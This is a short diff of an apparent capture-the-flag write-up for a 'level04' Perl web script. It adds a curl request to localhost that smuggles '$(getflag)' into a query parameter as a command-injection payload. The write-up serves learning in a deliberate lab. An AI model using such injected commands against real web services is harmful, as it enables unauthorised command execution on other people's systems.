@@ -2,4 +2,8 @@ The file level04.pl contains a Perl script. A copy of this file at /var/www/leve
 
 By injecting the command /bin/getflag we can bypass finding the password for flag04 and getting the flag for level05 directly.
 
+
+curl http://localhost:4747?x='$(getflag)'
+
+
 There is no password for flag04 in this level.
